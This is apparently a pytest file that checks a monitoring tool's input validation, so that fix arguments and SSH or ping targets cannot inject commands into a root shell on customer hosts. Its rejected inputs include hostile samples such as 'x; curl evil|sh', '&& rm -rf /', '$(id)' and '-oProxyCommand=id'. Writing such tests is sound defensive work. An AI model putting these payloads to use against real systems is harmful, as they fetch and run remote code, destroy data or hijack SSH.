"""A fix's `arg` is interpolated into a root shell on a customer host, so it
is checked against a strict shape per action before any command is built
(audit 2026-09-28, issue 2). Anything else is refused and nothing runs."""
import pytest

from guardian_sensor import fix, paths, util

CFG = {"ssh_hosts": [{"name": "prod", "host": "1.2.3.4", "user": "root"}]}


def _run(tmp_path, monkeypatch, action, arg):
    monkeypatch.setattr(paths, "DATA_DIR", str(tmp_path))
    calls = []
    def runner(h, cmd, timeout=120): calls.append(cmd); return "ok"
    r = fix.apply_fix(CFG, "prod", action, arg=arg, by="test", lock=False, runner=runner)
    return r, calls


@pytest.mark.parametrize("action,arg", [
    ("restart_service", "x; curl evil|sh"),
    ("restart_service", "-h"),
    ("restart_container", "web $(id)"),
    ("block_ip", "1.2.3.4; reboot"),
    ("block_ip", "not-an-ip"),
    ("block_subnet", "10.0.0.0/8 && rm -rf /"),
    ("ban_long", "`id`"),
    ("kill_miner", "xmrig; reboot"),
    ("security_updates", "openssl; reboot"),
    ("restart_service", None),
])
def test_a_bad_arg_is_refused_and_nothing_runs(tmp_path, monkeypatch, action, arg):
    r, calls = _run(tmp_path, monkeypatch, action, arg)
    assert r["ok"] is False
    assert not calls


@pytest.mark.parametrize("action,arg", [
    ("restart_service", "nginx"),
    ("restart_service", "getty@tty1.service"),
    ("restart_container", "web-1"),
    ("block_ip", "203.0.113.7"),
    ("block_ip", "2001:db8::1"),
    ("block_subnet", "203.0.113.0/24"),
    ("ban_long", "198.51.100.9"),
    ("kill_miner", "xmrig kdevtmpfsi"),
    ("security_updates", "openssl libssl3"),
    ("security_updates", None),
])
def test_a_good_arg_runs(tmp_path, monkeypatch, action, arg):
    r, calls = _run(tmp_path, monkeypatch, action, arg)
    assert calls, r


def test_arg_reason_names_the_problem():
    assert fix.arg_problem("block_ip", "nope") == "block_ip needs an IP address"
    assert fix.arg_problem("enable_ufw", None) is None


def test_ssh_refuses_a_target_that_reads_as_an_option(monkeypatch):
    ran = []
    monkeypatch.setattr(util.subprocess, "run", lambda *a, **k: ran.append(a))
    rc, out = util.ssh_run({"target": "-oProxyCommand=touch /tmp/x"}, "true")
    assert rc != 0 and not ran


def test_a_check_target_that_reads_as_an_option_never_reaches_ping(monkeypatch):
    from guardian_sensor import checks
    ran = []
    monkeypatch.setattr(checks.subprocess, "run", lambda *a, **k: ran.append(a))
    r = checks.check_one({"name": "x", "type": "icmp", "target": "-f"})
    assert r["ok"] is False and not ran


def test_host_check_refuses_an_option_like_target(monkeypatch):
    from guardian_sensor import hosts
    ran = []
    monkeypatch.setattr(hosts.subprocess, "run", lambda *a, **k: ran.append(a))
    r = hosts.check_ssh({"name": "x", "target": "-oProxyCommand=id"}, {})
    assert "refused" in r["error"] and not ran
